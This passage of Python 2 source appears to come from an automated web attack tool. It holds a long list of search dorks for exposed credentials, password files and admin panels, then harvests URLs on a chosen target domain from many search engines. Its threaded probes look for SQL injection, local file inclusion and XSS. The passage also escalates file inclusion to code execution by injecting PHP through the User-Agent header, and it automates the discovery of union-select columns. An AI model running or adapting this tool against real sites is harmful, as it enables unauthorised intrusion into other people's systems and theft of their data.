         'Configuration.Filesoftcart.exe', 'ConnectionStatusintextCurrentlogin', 'ConnectionTest.javafiletypehtml',
         'ContentManagementSystemusername|password|adminMicrosoftIE5.5mambo',
         'ContentManagementSystemusername|password|adminMicrosoftIE5.5?mambo', 'CopyrightcTektronixInc.printerstatus',
         'Copyright?TektronixInc.printerstatus', 'Count.cgijj', 'CrazyWWWBoard.cgi',
         'CrazyWWWBoard.cgiintextdetaileddebugginginformation', 'CuteNews2003..2005CutePHP', 'DUpaypalsiteduware.com',
         'DWMailpassworddwmail', 'DefaultPLESKPage', 'DellRemoteAccessController', 'DocuShare',
         'DocuSharedocushare/dsweb/faq']
d0rk += ['DocuSharedocushare/dsweb/faqgovedu', 'DocutekEResAdminLoginedu', 'Doncaster/events/event.php?ID',
         'Duclassifiedsiteduware.comDUwareAllRightsreserved', 'Dudirectorysiteduware.com', 'Dumpingdatafortable',
         'EXTRANETIdentification', 'EXTRANETlogin.edu.mil.gov', 'EZPartnernetpond', 'EasyFileSharingWebServer',
         'EliteForumVersion.', 'Emergisoftwebapplicationsareapartofour', 'EmployeeIntranetLogin',
         'ErrorDiagnosticInformationErrorOccurredWhile', 'ErrorOccurredTheerroroccurredinfiletypecfm',
         'ErrorOccurredWhileProcessingRequestWHERESELECT|INSERTfiletypecfm', 'ErrorusingHypernewsServerSoftware',
         'EstablishingasecureIntegratedLightsOutsessionwithORDataFrameBrowsernotHTTP1.1compatibleORHPIntegratedLights',
         'EverFocus.EDSR.app<b>let', 'EverFocus.EDSR.applet', 'Executionofthiss?ri?tnotpermitted', 'FREE/poll.php?pid',
         'FTProotat', 'FaqDetail.php?ID', 'FatalerrorCalltoundefinedfunctionreplythenext', 'FeaturedSite.php?id',
         'FernandFaerie/index.asp?c', 'FernandFaerie/index.php?c', 'Fichiercontenantdesinformationssurler?seau',
         'Financialspreadsheetsfinance.xls', 'Financialspreadsheetsfinances.xls',
         'FlashOperatorPanelextphpwikicmsasternicsipANNOUNCElists',
         'FrontPageextpwdservice|authors|administrators|users', 'FullStory.asp?Id', 'FullStory.php?Id',
         'GRC.DATintextpassword', 'GT5/cardetails.php?id', 'Galleryinconfigurationmode', 'GangliaClusterReports',
         'GatewayConfigurationMenu', 'GeneratedbyphpSystem', 'GetItems.asp?itemid', 'GetItems.cfm?itemid',
         'GetItems.php?itemid', 'GradeMap/index.php?page', 'GradeMap/index.php?pageadmin.php?caldir',
         'GroupOfficeEnteryourusernameandpasswordtologin',
         'HPWBEMLogin|Youarebeingpromptedtoprovideloginaccountinformationfor|Pleaseprovidetheinformationrequestedandpress',
         'HSTSNRnetop.com', 'HTTPFROMgooglebotgooglebot.comServerSoftware', 'HassanConsultingsShoppingCartVersion1.18',
         'HassanConsulting?sShoppingCartVersion1.18', 'HistoryStore/pages/item.asp?itemID',
         'HistoryStore/pages/item.php?itemID', 'HordeMyPortal[Tickets', 'HostVulnerabilitySummaryReport',
         'HostingAcceleratorloginUsernamenewsdemo', 'ICQchatlogsplease...', 'ICQchatlogsplease?', 'IIS4.0errormessages',
         'IISwebservererrormessages', 'IMPimp/index.php3', 'IMailServerWebMessaginglogin', 'INDEXU',
         'INURLORALLINURLWITH', 'INURLORINURLWITH', 'ISPManUnauthorizedAccessprohibited',
         'ITSSystemInformationPleaselogontotheSAPSystem', 'IcecastAdministrationAdminPage', 'IlohaMail',
         'Incorrectsyntaxnear', 'Index.ofetcshadow', 'Index.ofetcshadowsitepasswd', 'Index.php?id',
         'IndexOf/networklastmodified', 'IndexOfcookies.txtsize', 'IndexOfmaillogmaillogsize',
         'Indexed.By|Monitored.ByhAcxFtpScan', 'Indexof..etcpasswd', 'Indexof.bashhistory',
         'Indexof.htpasswdhtgroupdistapachehtpasswd.c', 'Indexof.mysqlhistory', 'Indexof.shhistory',
         'Indexof/.htaccess', 'Indexof/admin', 'Indexof/backup', 'Indexof/chat/logs', 'Indexof/mail', 'Indexof/passwd',
         'Indexof/password', 'Indexof/password.txt', 'Indexofcfide', 'Indexofpasswordsmodified', 'IndexofphpMyAdmin',
         'Indexofscserv.confscservcontent', 'Indexofspwd.dbpasswdpam.conf', 'Indexofuploadsizeparentdirectory',
         'InstalledObjectsScannerdefault.asp', 'Interior/productlist.asp?id', 'Interior/productlist.php?id',
         'InternalServerError', 'InternalServerErrorserverat', 'InvisionPowerBoardDatabaseError', 'JetboxOneCMS?|',
         'JetboxOneCMS??|', 'Jetstream?', 'JoomlaWebInstaller', 'KM/BOARD/readboard.asp?id',
         'KM/BOARD/readboard.php?id',
         'KeyWordNukeETCopyright2004porTruzone.orall.edu./modules.php?nameallmyguestsorpoweredbyAllMyGuests',
         'KeywordpoweredbyAllMyLinks', 'KurantCorporationStoreSensefiletypebok',
         'LOGREPLogfilereportingsystemsiteitefix.no', 'LeapFTPindex.of./sites.inimodified', 'LinkDepartment',
         'Links/browse.php?id', 'List.asp?CatID', 'List.cfm?CatID', 'List.php?CatID', 'ListMailLoginadmindemo', 'Login',
         'LoginForum', 'LoginSunCobaltRaQ', 'LoginWebmailer', 'LoginintextRTis?Copyright', 'LogintoCacti',
         'LogintoCalendar', 'LogintoMailextpl|indexdwaffleman', 'LogintoUsermin20000',
         'Logintotheforumsaimoo.comlogin.cfm?id', 'LookingGlass', 'LotusDominoaddressbooks',
         'MXControlConsoleIfyoucantremember', 'MXControlConsoleIfyoucan?tremember',
         'MYSQLerrormessagesuppliedargument....', 'MYSQLerrormessagesuppliedargument?.',
         'MacHTTPfiletypelogmachttp.log', 'MailManLogin', 'MailServerCMailServerWebmail5.2',
         'MailServerCMailServerWebmail5.2?', 'ManyServers.htm', 'MecuryVersionInfastructureGroup',
         'MemberLoginNOTEYourbrowsermusthavecookiesenabledinordertologintothesite.extphpORextcgi',
         'MerakMailServerSoftware.gov.mil.edusitemerakmailserver.com', 'MerakMailServerWebAdministrationihackstuff.com',
         'MicrosoftCRMUnsupportedBrowserVersion', 'MicrosoftMoneyDataFiles', 'MicrosoftRWindowsTMVersionDrWtsn32C',
         'MicrosoftRWindowsTMVersionDrWtsn32CopyrightCextlog', 'MicrosoftSiteServerAnalysis',
         'MidmartMessageboardAdministratorLogin', 'MikroTikRouterOSManagingWebpage', 'MobilePublisherPHP',
         'MonsterTopListMTLnumrange200', 'MoreDetails.asp?id', 'MoreDetails.php?id', 'MoreInfoaboutMetaCartFree',
         'MostSubmittedFormsandScriptsthissection', 'MostSubmittedFormsands?ri?tsthissection', 'MultimonUPSstatuspage',
         'MvBlogpowered', 'MySQLtabledatadumps']
d0rk += ['MyeGery/public/displayCategory.php?basepath', 'NessusScanReportThisfilewasgeneratedbyNessus',
         'NetscapeApplicationServerErrorpage', 'NetworkHostAssessmentReportInternetScanner',
         'NetworkVulnerabilityAssessmentReport', 'News/pressrelease.php?id', 'NickServregistrationpasswords',
         'NmConsole/Login.asp|LoginIpswitchWhatsUpProfessional2005|intextIpswitchWhatsUpProfessional2005SP1IpswitchInc',
         'Node.ListWin32.Version.3.11', 'NovellNetWareintextnetwaremanagementportalversion',
         'NovellWebAccessCopyrightNovellInc', 'NovellWebServicesGroupWisedoc/11924.mil.edu.govfiletypepdf',
         'NovellWebServicesGroupWisedoc/11924?.mil.edu.govfiletypepdf',
         'NovellWebServicesintextSelectaserviceandalanguage.', 'OPENSRSDomainManagementmanage.cgi',
         'ORA00921unexpectedendofSQLcommand', 'ORA00933SQLcommandnotproperlyended', 'ORA00936missingexpression',
         'ORA12541TNSnolistenererroroccurred', 'OWAPublicFoldersdirectview',
         'OfficeConnectCable/DSLGatewayintextCheckingyourbrowser', 'OnLineRecruitmentProgramLogin',
         'OrderForm.asp?Cart', 'OrderForm.cfm?Cart', 'OrderForm.php?Cart', 'OutlookWebAccessabetterway',
         'OutputproducedbySysWatch', 'Ovislinkprivate/login', 'PCMA/productDetail.php?prodId',
         'PHPAdvancedTransferindex.php|showrecent.php', 'PHPAdvancedTransferlogin.php',
         'PHPBTTrackerStatistics|PHPBTTrackerStatistics', 'PHPapplicationwarningsfailingincludepath',
         'PHPhotoalbumStatistics', 'PHPhotoalbumUpload', 'PHProjektloginloginpassword', 'POWEREDBYHITJAMMER1.0!',
         'PRTGTrafficGrapherallsensors|PRTGTrafficGrapherMonitoringResults', 'Packages.php?sourcedir', 'Pageid',
         'Pages/whichArticle.asp?id', 'Pages/whichArticle.php?id',
         'ParseerrorparseerrorunexpectedTVARIABLEonlinefiletypephp', 'PeoplesMSNcontactlists',
         'Philex0.2s?ri?tsitefreelists.org', 'PhorumAdminDatabaseConnectionforumadmin', 'PhotoPostPHPUpload',
         'PhpMyExplorerindex.phpcvs', 'Pleaseauthenticateyourselftogetaccesstothemanagementinterface',
         'Pleaseenteravalidpassword!polladmin', 'PleaseloginForums', 'Pleaseloginwithadminpassleaksourceforge',
         'PostgreSQLqueryfailedERRORparserparseerror', 'PoweredByScozNews', 'PoweredbyUebiMiausitesourceforge.net',
         'PoweredbymnoGoSearchfreewebsearchenginesoftware', 'Product.php?Showproduct', 'Products/Catsub.php?recordID',
         'Products/mfr.php?mfg', 'Products/products.php?showonly', 'Proxy.txt', 'QueryDescription', 'Quickendatafiles',
         'Quote.asp?bookID', 'RFI', 'RFIANDLFI', 'Range.php?rangeID', 'RedKernel', 'RemoteDesktopWebConnection',
         'RemoteDesktopWebConnectiontsweb', 'RequestDetailsControlTreeServerVariables',
         'RetinaReportCONFIDENTIALINFORMATION', 'RunninginChildmode',
         'SFXAdminsfxglobal|SFXAdminsfxlocal|SFXAdminsfxtest', 'SHOUTcastAdministratoradmin.cgi', 'SQLDORK',
         'SQLServerDriver][SQLServer]Line1Incorrectsyntaxnear', 'SQLdatadumps', 'SQLsyntaxerror',
         'SQuery/lib/gore.php?libpath', 'SQuery/lib/gore.php?libpath/SQuery/', 'SWWlinkPleasewait.....',
         'Sales/viewitem.asp?id', 'Sales/viewitem.php?id', 'SambaWebAdministrationToolintextHelpWorkgroup',
         'Scriviamo\WindowsXPProfessional\94FBR', 'Search.pl', 'SearchDataSheet.asp?ID',
         'SearchProduct/ListProduct.php?PClassify3SN', 'SecerchiamoilserialediWindowsXPPro.', 'SelectItem.asp?id',
         'SelectItem.cfm?id', 'SelectItem.php?id', 'Selectadatabasetoviewfilemakerpro',
         'ServerUsernameotherinformation', 'Services.asp?ID', 'Services.cfm?ID', 'Services.php?ID', 'SessionServlet',
         'ShadowSecurityScannerperformedavulnerabilityassessment', 'Shop/home.asp?cat', 'Shop/home.php?cat',
         'ShopSearch.asp?CategoryID', 'ShopSearch.cfm?CategoryID', 'ShopSearch.php?CategoryID', 'Sites.datPASS',
         'Snitz!forumsdbpatherror', 'SnortSnarfalertpage', 'Squidcacheserverreports',
         'SquirrelMailversionBytheSquirrelMaildevelopmentTeam', 'Stacks/storyprof.php?ID',
         'SteamboatSpringsVacationRental.php?ID', 'StoreRedirect.asp?ID', 'StoreRedirect.cfm?ID',
         'StoreRedirect.php?ID', 'StoreViewProducts.asp?Cat', 'StoreViewProducts.cfm?Cat', 'StoreViewProducts.php?Cat',
         'StrayQuestionsView.php?num', 'SuSELinuxOpenexchangeServerPleaseactivateJavas?ri?t!',
         'SuperoDoctorIIIsupermicro', 'SuppliedargumentisnotavalidMySQLresultresource',
         'SuppliedargumentisnotavalidPostgreSQLresult', 'Syntaxerrorinqueryexpressionthe', 'SysCPlogin',
         'SystemStatisticsSystemandNetworkInformationCenter', 'TOPdeskApplicationServer', 'TUTOSLogin', 'TWIGLogin',
         'TerminalServicesWebConnection', 'Thankyouforyourorderreceipt', 'Thankyouforyourpurchasedownload',
         'Thefollowingreportcontainsconfidentialinformationvulnerabilitysearch',
         'TherearenoAdministratorsAccountsadmin.phpmysqlfetchrow',
         'ThereseemstohavebeenaproblemwiththePleasetryagainbyclickingtheRefreshbuttoninyourwebbrowser.',
         'Thes?ri?twhoseuidisisnotallowedtoaccess', 'Thesestatisticswereproducedbygetstats',
         'Thestatisticswerelastupd?t?dDailymicrosoft.com', 'ThisisaShareazaNode',
         'ThisisarestrictedAccessServerJavas?ri?tNotEnabled!|MessengerExpresseduac',
         'ThisreportlistsidentifiedbyInternetScanner', 'ThisreportwasgeneratedbyWebLog',
         'ThissectionisforAdministratorsonly.Ifyouareanadministratorthenplease', 'Thissummarywasgeneratedby',
         'TomcatServerAdministration', 'TopResources.php?CategoryID',
         'TotalUsernamesintextnamesandstatisticalinformation']
d0rk += ['TrackerCamLiveVideo|TrackerCamApplicationLogin|TrackercamRemotetrackercam.com',
         'TrafficAnalysisforRMONPortonunit', 'UBB.threads|login.phpubb', 'UebiMiausitesourceforge.net',
         'UltimaOnlineloginservers', 'UnabletojumptorowonMySQLresultindexonline',
         'Unclosedquotationmarkbeforethecharacterstring', 'Underconstructiondoesnotcurrentlyhave', 'UnrealIRCd',
         'UploaderUploaderv6pixloads.com', 'Uploaderv6?pixloads.com', 'UsageStatisticsforGeneratedbyWebalizer',
         'VHCSProverdemo', 'VIDEOWEBSERVERintextVideoWebServerAnytime&Any',
         'VIDEOWEBSERVERintextVideoWebServerAnytime&Anywhereusernamepassword', 'VMwareManagementInterfacevmware/en/',
         'VNCDesktop5800', 'VNCviewerforJava', 'VPASPShopAdministratorsonly', 'VersionInfoBootVersionInternetSettings',
         'View.php?view', 'ViewPodcast.php?id', 'ViewProduct.asp?misc', 'ViewProduct.cfm?misc', 'ViewProduct.php?misc',
         'ViewerFrame?Mode', 'ViewerFrame?ModeRefresh', 'VirtualServerAdministrationSystem', 'VisNeticWebMail/mail/',
         'VitalQIPIPManagementSystem', 'WCPUSER', 'WJNT104MainPage', 'WNailerUploadArea', 'WSFTP.LOG',
         'Threads|threads/login.php|threads/login.pl?Cat', 'WarningBadargumentstojoin|implodeinonlinehelpforum',
         'WarningCannotmodifyheaderinformationheadersalreadysent', 'WarningDivisionbyzeroinonlineforum',
         'WarningSAFEMODERestrictionineffect.Thes?ri?twhoseuidisisnotallowedtoaccessownedbyuid0inonline',
         'WarningSuppliedargumentisnotavalidFileHandleresourcein', 'WarningfailedtoopenstreamHTTPrequestfailedonline',
         'WarningmysqlconnectAccessdeniedforuseronlinehelpforum',
         'WarningmysqlconnectAccessdeniedforuser˜onlinehelpforum', 'Warningmysqlqueryinvalidquery',
         'WarningpgconnectUnabletoconnecttoPostgreSQLserverFATAL',
         'WebBasedManagementPleaseinputpasswordtologinjohnny.ihackstuff.com',
         'WebExplorerServerLoginWelcometoWebExplorerServer', 'WebFileBrowserUseregularexpression', 'WebLogReferrers',
         'WebLogicServerConsoleLoginconsole', 'WebSTARMailPleaseLogIn', 'WebServerStatisticsfor',
         'WebStatisticamain.php|WebSTATISTICAserverstatsoftstatsoftsastatsoftinc.comedusoftwarerob',
         'WelcomeSite/UserAdministratorPleaseselectthelanguagedemos',
         'WelcometoAdministrationGeneralLocalDomainsSMTPAuthenticationadmin',
         'WelcometoFSecurePolicyManagerServerWelcomePage', 'WelcometoIntranet', 'WelcometoMailtraqWebMail',
         'WelcometoPHPNukecongratulations', 'WelcometoWindows2000InternetServices', 'Welcometontop!',
         'WelcometotheAdvancedExtranetServerADVX!', 'WelcometothePrestigeWebBasedConfigurator',
         'WhitsundaySailing.php?id', 'Windows2000webservererrormessages',
         'WmSCeCartAdministration|WebMyStyleeCartAdministration', 'WorldClientintext?2003|2004AltNTechnologies.',
         'WsAncillary.asp?ID', 'WsAncillary.cfm?ID', 'WsAncillary.php?ID', 'WsPages.asp?ID',
         'WsPages.asp?IDnoticiasDetalle.asp?xid', 'WsPages.cfm?IDHP', 'WsPages.php?IDnoticiasDetalle.php?xid',
         'XAMPPxampp/index', 'XMailWebAdministrationInterfaceintextLoginintextpassword', 'XOOPSCustomInstallation',
         'XcAuctionLite|DRIVENBYXCENTLiteadmin', 'XcCDONTS.asp', 'YZboard/view.asp?id', 'YZboard/view.php?id',
         'YaBB.pl', 'YaBBSEDevTeam', 'YouhaveanerrorinyourSQLsyntaxnear',
         'Youhaverequestedaccesstoarestrictedareaofourwebsite.Pleaseauthenticateyourselftocontinue.',
         'Youhaverequestedtoaccessthemanagementfunctions.edu', 'YourpasswordisRememberthisforlateruse',
         'ZopeHelpSystemHelpSys', 'ZyXELPrestigeRouterEnterpassword',
         '[MyAlbumDIR]/language.inc.php?langsdir[MyAlbumDIR]', '[ScriptPath]/admin/index.php?oadmin/index.php',
         '[ScriptPath]/admin/index.php?oadmin/index.php;', '[WFClient]Passwordfiletypeica',
         '\Asyntaxerrorhasoccurred\filetypeihtml',
         '\AutoCreateTRUEpassword\Cercalepasswordper\WebsiteAccessAnalyzer\unsoftwaregiapponese\http//oppure',
         '\ChatologicaMetaSearch\\stacktracking', '\Indexof/backup', '\Indexof\config.php',
         '\Indexof\passwordsmodified',
         '\MoreInfoaboutCartFree\Comersus.mdbdatabasemidicart.mdbshopdbtest.aspPOWEREDBYHITJAMMER.!siteups.com\UpsPackagetracking\intext\Z',
         '\ORA00921unexpectedendofSQLcommand', '\accessdeniedforuser\\usingpassword', '\http//gamespyoppurehttp',
         '\parentdirectory\FILECHECERCOxxxhtmlhtmphpshtmlopendivxmd5md5sums', '\setsmodek', 'about.asp?cartID',
         'about.cfm?cartID', 'about.php?cartID', 'about.php?id', 'aboutbook.php?id', 'aboutchiangmai/details.asp?id',
         'aboutchiangmai/details.php?id', 'aboutprinter.shtml', 'abouttheregionsprovince.php?id',
         'abouttheregionsvillage.php?id', 'aboutus.asp?id', 'aboutus.php?id', 'abroad/page.asp?cid',
         'abroad/page.php?cid', 'access', 'access.log', 'accessdeniedforuserusingpassword', 'accinfo.asp?cartId',
         'accinfo.cfm?cartId', 'accinfo.php?cartId', 'accion', 'acclogin.asp?cartID', 'acclogin.cfm?cartID',
         'acclogin.php?cartID', 'account.php?actionaccount.php?action', 'account.php?actioniurl.php?action',
         'account.php?actioniurlaccount.php?action', 'account.php?actionphp?action', 'accounts.php?commandphp?command',
         'acidmain.php', 'act', 'action', 'actiontecmainsetupstatusCopyright2001ActiontecElectronicsInc', 'ad.cgi',
         'ad.php?id', 'adcycle', 'add.asp?bookid', 'add.cfm?bookid', 'add.exe', 'add.php?bookid', 'addItem.asp',
         'addItem.cfm', 'addItem.php', 'addToCart.asp?idProduct']




def search(maxc):
	urls = []
	urls_len_last = 0
	for site in sitearray:
		dark = 0
		for dork in go:
			dark += 1
			page = 0
			try:
				while page < int(maxc):
					try:
						jar = cookielib.FileCookieJar("cookies")
						query = dork + "+site:" + site
						results_web = 'http://www.galaxy.com/search/gsite?cx=partner-pub-7997125561256657%3Aihfdd571hqo&cof=FORID%3A10&ie=UTF-8&q=' + query + 'hl=en&page=' + repr(
							page) + '&src=hmp' and 'http://www.search-results.com/web?o=&tpr=1&q=' + query + '&hl=en&page=' + repr(
							page) + '&src=hmp' and 'http://blekko.com/#?q=' + query + '&hl=en&page=' + repr(
							page) + '&src=hmp' and 'http://search.lycos.com/web?q=' + query + '&hl=en&page=' + repr(
							page) + '&src=hmp' and 'http://www.webcrawler.com/search/web?fcoid=421&fcop=topnav&fpid=27&aid=ab8d8d87-cd66-4573-898b-e2585c92c0ba&ridx=1&q=' + query + '&hl=en&page=' + repr(
							page) + '&src=hmp' and 'http://msxml.excite.com/search/web?q=' + query + '&hl=en&page=' + repr(
							page) + '&src=hmp' and 'https://duckduckgo.com/?q=' + query + '&hl=en&page=' + repr(
							page) + '&src=hmp' and 'https://www.gigablast.com/search?k8c=17319&q=' + query + '&hl=en&page=' + repr(
							page) + '&src=hmp' and 'http://www.gibiru.com/?cx=partner-pub-5956360965567042%3A8627692578&cof=FORID%3A11&ie=UTF-8&q=' + query + '&hl=en&page=' + repr(
							page) + '&src=hmp' and 'http://www.dogpile.com/info.dogpl.t10.5/search/web?fcoid=417&fcop=topnav&fpid=27&q=' + query + '&hl=en&page=' + repr(
							page) + '&src=hmp' and 'http://www.bing.com/search?q=' + query + '&hl=en&page=' + repr(
							page) + '&src=hmp'
						request_web = urllib2.Request(results_web)
						agent = random.choice(header)
						request_web.add_header('User-Agent', agent)
						opener_web = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
						text = opener_web.open(request_web).read()
						stringreg = re.compile('(?<=href=")(.*?)(?=")')
						names = stringreg.findall(text)
						page += 1
						for name in names:
							if name not in urls:
								if re.search(r'\(', name) or re.search("<", name) or re.search("\A/",
								                                                               name) or re.search(
										"\A(http://)\d", name):
									pass
								elif re.search("google", name) or re.search("youtube", name) or re.search("phpbuddy",
								                                                                          name) or re.search(
										"iranhack", name) or re.search("phpbuilder", name) or re.search("codingforums",
								                                                                        name) or re.search(
										"phpfreaks", name) or re.search("%", name) or re.search("facebook",
								                                                                name) or re.search(
										"twitter", name) or re.search("hackforums", name) or re.search("askjeeves",
								                                                                       name) or re.search(
										"wordpress", name) or re.search("github", name):
									pass
								elif re.search(site, name):
									urls.append(name)
						darklen = len(go)
						percent = int((1.0 * dark / int(darklen)) * 100)
						urls_len = len(urls)
						sys.stdout.write(
							"\rSite: %s | Collected urls: %s | D0rks: %s/%s | Percent Done: %s | Current page no.: %s <> " % (
							site, repr(urls_len), dark, darklen, repr(percent), repr(page)))
						sys.stdout.flush()
						if urls_len == urls_len_last:
							page = int(maxc)
						urls_len_last = len(urls)

					except:
						pass
			except KeyboardInterrupt:
				pass
		tmplist = []
		print "\n\n[+] URLS (unsorted): ", len(urls)
		for url in urls:
			try:
				host = url.split("/", 3)
				domain = host[2]
				if domain not in tmplist and "=" in url:
					finallist.append(url)
					tmplist.append(domain)

			except:
				pass
		print "[+] URLS (sorted)  : ", len(finallist)
		return finallist




class injThread(threading.Thread):
	def __init__(self, hosts):
		self.hosts = hosts
		self.fcount = 0
		self.check = True
		threading.Thread.__init__(self)

	def run(self):
		urls = list(self.hosts)
		for url in urls:
			try:
				if self.check:
					ClassicINJ(url)
				else:
					break
			except(KeyboardInterrupt, ValueError):
				pass
		self.fcount += 1

	def stop(self):
		self.check = False


class lfiThread(threading.Thread):
	def __init__(self, hosts):
		self.hosts = hosts
		self.fcount = 0
		self.check = True
		threading.Thread.__init__(self)

	def run(self):
		urls = list(self.hosts)
		for url in urls:
			try:
				if self.check:
					ClassicLFI(url)
				else:
					break
			except(KeyboardInterrupt, ValueError):
				pass
		self.fcount += 1

	def stop(self):
		self.check = False


class xssThread(threading.Thread):
	def __init__(self, hosts):
		self.hosts = hosts
		self.fcount = 0
		self.check = True
		threading.Thread.__init__(self)

	def run(self):
		urls = list(self.hosts)
		for url in urls:
			try:
				if self.check:
					ClassicXSS(url)
				else:
					break
			except(KeyboardInterrupt, ValueError):
				pass
		self.fcount += 1

	def stop(self):
		self.check = False


def ClassicINJ(url):
	EXT = "'"
	host = url + EXT
	try:
		source = urllib2.urlopen(host).read()
		for type, eMSG in sqlerrors.items():
			if re.search(eMSG, source):
				print R + "[!] w00t!,w00t!:", O + host, B + "Error:", type, R + " ---> SQL Injection Found"
				logfile.write("\n" + host)
				vuln.append(host)
				col.append(host)
				break


			else:
				pass
	except:
		pass


def ClassicLFI(url):
	lfiurl = url.rsplit('=', 1)[0]
	if lfiurl[-1] != "=":
		lfiurl = lfiurl + "="
	for lfi in lfis:
		try:
			check = urllib2.urlopen(lfiurl + lfi.replace("\n", "")).read()
			if re.findall("root:x", check):
				print R + "[!] w00t!,w00t!: ", O + lfiurl + lfi, R + " ---> Local File Include Found"
				lfi_log_file.write("\n" + lfiurl + lfi)
				vuln.append(lfiurl + lfi)
				target = lfiurl + lfi
				target = target.replace("/etc/passwd", "/proc/self/environ", "/etc/passwd%00")
				header = "<? echo md5(NovaCygni); ?>"
				try:
					request_web = urllib2.Request(target)
					request_web.add_header('User-Agent', header)
					text = urllib2.urlopen(request_web)
					text = text.read()
					if re.findall("7ca328e93601c940f87d01df2bbd1972", text):
						print R + "[!] w00t!,w00t!: ", O + target, R + " ---> LFI to RCE Found"
						rce_log_file.write("\n", target)
						vuln.append(target)
				except:
					pass

		except:
			pass


def ClassicXSS(url):
	for xss in xsses:
		try:
			source = urllib2.urlopen(url + xss.replace("\n", "")).read()
			if re.findall("XSS Vuln FromCharCode filter bypass detected", source) or re.findall(
					"Basic XSS Vuln Detected", source) or re.findall("Case Sensitive XSS Vector", source) or re.findall(
					"Malformed A Tag Attack Vuln", source) or re.findall("UTF8 Unicode XSS Vuln Detected",
			                                                             source) or re.findall(
					"XSS BodyTag Vuln Detected", source) or re.findall("US-ASCII XSS Bypass Vuln Detected",
			                                                           source) or re.findall(
					"XSS Embedded Tab Vulnerability", source) or re.findall("XSS Hex Vulnerability",
			                                                                source) or re.findall(
					"XSS Embedded Encoded Tab Vulnerability", source) or re.findall(
					"XSS Extraneous Open Brackets Vulnerability", source) or re.findall("XSS Base 64 Encoding Bypass",
			                                                                            source) or re.findall(
					"XSS Javascript Escapes Vulnerability Detected", source) or re.findall(
					"XSS End Title Tag Vulnerability Detected", source) or re.findall(
					"XSS Style Tags with Broken Javascript Vulnerability Detected", source):
				print R + "[!] w00t!,w00t!: ", O + url + xss, R + " ---> XSS Found (might be false, responce tested positive to 'source' inspection)"
				xss_log_file.write("\n" + url + xss)
				vuln.append(url + xss)
		except:
			pass


def injtest():
	print B + "\n[+] Preparing for SQLi scanning ..."
	print "[+] Can take a while ..."
	print "[!] Working ...\n"
	i = len(usearch) / int(numthreads)
	m = len(usearch) % int(numthreads)
	z = 0
	if len(threads) <= numthreads:
		for x in range(0, int(numthreads)):
			sliced = usearch[x * i:(x + 1) * i]
			if z < m:
				sliced.append(usearch[int(numthreads) * i + z])
				z += 1
			thread = injThread(sliced)
			thread.start()
			threads.append(thread)
		for thread in threads:
			thread.join()


def lfitest():
	print B + "\n[+] Preparing for LFI - RCE scanning ..."
	print "[+] Can take a while ..."
	print "[!] Working ...\n"
	i = len(usearch) / int(numthreads)
	m = len(usearch) % int(numthreads)
	z = 0
	if len(threads) <= numthreads:
		for x in range(0, int(numthreads)):
			sliced = usearch[x * i:(x + 1) * i]
			if z < m:
				sliced.append(usearch[int(numthreads) * i + z])
				z += 1
			thread = lfiThread(sliced)
			thread.start()
			threads.append(thread)
		for thread in threads:
			thread.join()


def xsstest():
	print B + "\n[+] Preparing for XSS scanning ..."
	print "[+] Can take a while ..."
	print "[!] Working ...\n"
	i = len(usearch) / int(numthreads)
	m = len(usearch) % int(numthreads)
	z = 0
	if len(threads) <= numthreads:
		for x in range(0, int(numthreads)):
			sliced = usearch[x * i:(x + 1) * i]
			if z < m:
				sliced.append(usearch[int(numthreads) * i + z])
				z += 1
			thread = xssThread(sliced)
			thread.start()
			threads.append(thread)
		for thread in threads:
			thread.join()




Scanner = 1
menu = True
while True:
	if Scanner == 1:
		threads = []
		finallist = []
		vuln = []
		col = []
		darkurl = []

		print W
		sites = raw_input("\nChoose your target(domain)   : ")
		sitearray = [sites]

		go = []

		dorks = raw_input("Choose the number of random dorks (0 for all.. may take awhile!)   : ");
		print ""
		if int(dorks) == 0:
			i = 0
			while i < len(d0rk):
				go.append(d0rk[i])
				i += 1
		else:
			i = 0
			while i < int(dorks):
				go.append(choice(d0rk))
				i += 1
			for g in go:
				print "dork: ", g

		numthreads = raw_input('\nEnter no. of threads : ')
		maxc = raw_input('Enter no. of pages   : ')
		print "\nNumber of SQL errors :", len(sqlerrors)
		print "Number of LFI paths  :", len(lfis)
		print "Number of XSS cheats :", len(xsses)
		print "Number of headers    :", len(header)
		print "Number of threads    :", numthreads
		print "Number of dorks      :", len(go)
		print "Number of pages      :", maxc
		print "Timeout in seconds   :", timeout
		print "Utilised Engines     : 11 >-< Encrypted Engines = 3 "
		print ""
		print ""
		print ""

		usearch = search(maxc)
		Scanner = 0

	print R + "\n[1] SQLi Testing"
	print "[2] SQLi Testing Auto Mode"
	print "[3] LFI - RCE Testing"
	print "[4] XSS Testing"
	print "[5] SQLi and LFI - RCE Testing"
	print "[6] SQLi and XSS Testing"
	print "[7] LFI -RCE and XSS Testing"
	print "[8] SQLi,LFI - RCE and XSS Testing"
	print "[9] Save valid urls to file"
	print "[10] Print valid urls"
	print "[11] Found vuln in last scan"
	print "[12] New scan"
	print "[0] Exit\n"
	chce = raw_input(":")
	if chce == '1':
		injtest()

	if chce == '2':
		injtest()
		print B + "\n[+] Preparing for Column Finder ..."
		print "[+] Can take a while ..."
		print "[!] Working ..."
		# Thanks rsauron for schemafuzz
		for host in col:
			print R + "\n[+] Target: ", O + host
			print R + "[+] Attempting to find the number of columns ..."
			print "[+] Testing: ",
			checkfor = []
			host = host.rsplit("'", 1)[0]
			sitenew = host + arg_eva + "and" + arg_eva + "1=2" + arg_eva + "union" + arg_eva + "all" + arg_eva + "select" + arg_eva
			makepretty = ""
			for x in xrange(0, colMax):
				try:
					sys.stdout.write("%s," % x)
					sys.stdout.flush()
					darkc0de = "dark" + str(x) + "c0de"
					checkfor.append(darkc0de)
					if x > 0:
						sitenew += ","
					sitenew += "0x" + darkc0de.encode("hex")
					finalurl = sitenew + arg_end
					gets += 1
					source = urllib2.urlopen(finalurl).read()
					for y in checkfor:
						colFound = re.findall(y, source)
						if len(colFound) >= 1:
							print "\n[+] Column length is:", len(checkfor)
							nullcol = re.findall("\d+", y)
							print "[+] Found null column at column #:", nullcol[0]
							for z in xrange(0, len(checkfor)):
								if z > 0:
									makepretty += ","
								makepretty += str(z)
							site = host + arg_eva + "and" + arg_eva + "1=2" + arg_eva + "union" + arg_eva + "all" + arg_eva + "select" + arg_eva + makepretty
							print "[+] SQLi URL:", site + arg_end
							site = site.replace("," + nullcol[0] + ",", ",darkc0de,")
							site = site.replace(arg_eva + nullcol[0] + ",", arg_eva + "darkc0de,")
							site = site.replace("," + nullcol[0], ",darkc0de")
							print "[+] darkc0de URL:", site
							darkurl.append(site)

							print "[-] Done!\n"
							break

